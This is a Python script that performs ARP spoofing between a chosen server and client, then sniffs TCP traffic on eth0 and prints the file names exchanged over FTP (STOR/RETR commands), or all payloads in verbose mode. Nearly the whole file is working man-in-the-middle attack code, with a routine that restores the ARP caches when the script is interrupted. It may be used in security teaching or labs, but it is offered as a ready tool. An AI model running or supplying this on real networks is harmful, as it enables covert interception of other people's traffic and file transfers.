
import pcapy
from impacket import ImpactPacket
from dpkt.ethernet import Ethernet
import threading
import socket
import argparse
import time
import re
from scapy.all import Ether, srp, send, sniff, TCP
from scapy.all import ARP

def parse_arguments():
    parser = argparse.ArgumentParser(description="ARP spoofing and traffic sniffing between a server and a client. It prints the names of the files exchanged")                 
    parser.add_argument('-v', '--verbose', action="store_true", help="Verbose mode, shows all FTP traffic")
    parser.add_argument("addr", nargs='*')
    arg = parser.parse_args()
    if len(arg.addr) != 4:
        print("[x] Usage: <IPv4-src> <MAC-src> <IPv4-target> <MAC-target>")
        exit(1)
    if is_valid_ipv4_address(arg.addr[0]) and is_valid_mac_address(arg.addr[1]) and \
        is_valid_ipv4_address(arg.addr[2]) and is_valid_mac_address(arg.addr[3]) and \
        arg.addr[0] != arg.addr[2] and arg.addr[1] != arg.addr[3]:
        return arg
    else:
        print("[x] Usage: <IPv4-src> <MAC-src> <IPv4-target> <MAC-target>")
        exit(1)

def is_valid_ipv4_address(ip_address):
    ipv4_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(ipv4_pattern, ip_address):
        return True
    return False

def is_valid_mac_address(mac_address):
    mac_pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
    if re.match(mac_pattern, mac_address):
        return True
    return False

def spoof(ip_target, ip_src, mac_target):
    """
    Spoofs `ip_target` saying that we are `ip_src`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    arp_response = ARP(pdst=ip_target, hwdst=mac_target, psrc=ip_src, op='is-at')
    send(arp_response, verbose=0)
    mac_self = ARP().hwsrc
    #print(f"[+] Sent to {ip_target} : {ip_src} is-at {mac_self}")
    print("[+] Sent to {}: {} is-at {}".format(ip_target, ip_src, mac_self))

def restore(ip_target, ip_src, mac_target, mac_src):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations 
    (real IP and MAC of `ip_src` ) to `ip_target`
    """
    arp_response = ARP(pdst=ip_target, hwdst=mac_target, psrc=ip_src, hwsrc=mac_src, op="is-at")
    send(arp_response, verbose=0, count=7)
    #print(f"[+] Sent to {ip_target} : {ip_src} is-at {mac_src}")
    print("[+] Sent to {} : {} is-at {}".format(ip_target, ip_src, mac_src))

def handle_interrupt(signal, frame):
    print("[!] Detected CTRL+C ! restoring the network, please wait...")
    restore(ip_target, ip_src, mac_target, mac_src)
    restore(ip_src, ip_target, mac_src, mac_target)
    exit(0)

class Sniff:
    def __init__(self, args):
        self.verbose = args.verbose

    def sniffing_loop(self):
        def packet_handler(header, data):
            eth = Ethernet(data) 
            ip = eth.data  
            payload = ip.data.data
            source_ip = socket.inet_ntoa(ip.src)
            destination_ip = socket.inet_ntoa(ip.dst)
            if self.verbose:
                print("{} -> {}: {}".format(source_ip, destination_ip, payload))  
            else:
                if "STOR" in payload and len(payload) < 100:
                    payload = payload.replace("STOR","")
                    print("{} -> {}: {}".format(source_ip, destination_ip, payload))
                elif "RETR" in payload and len(payload) < 100:
                    payload = payload.replace("RETR","")
                    print("{} -> {}: {}".format(destination_ip, source_ip, payload))
        p = pcapy.open_live("eth0", 65536, 1, 0)
        p.setfilter('tcp')
        p.loop(0, packet_handler)

if __name__ == "__main__":
    args = parse_arguments()

    ip_src = args.addr[0] 
    mac_src = args.addr[1] 

    ip_target = args.addr[2] 
    mac_target = args.addr[3] 

    spoof(ip_target, ip_src, mac_target)
    spoof(ip_src, ip_target, mac_src)
    
    #SCAPY
    #while True:
    #    sniff(filter="tcp", prn=lambda x:x.sprintf("{IP:%IP.src% -> %IP.dst%:}{Raw:%Raw.load%}"))
    #except KeyboardInterrupt:
    #    handle_interrupt(None, None)

    s = Sniff(args)
    sniff_thread = threading.Thread(target=s.sniffing_loop)
    sniff_thread.daemon = True
    sniff_thread.start()
    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        handle_interrupt(None, None)
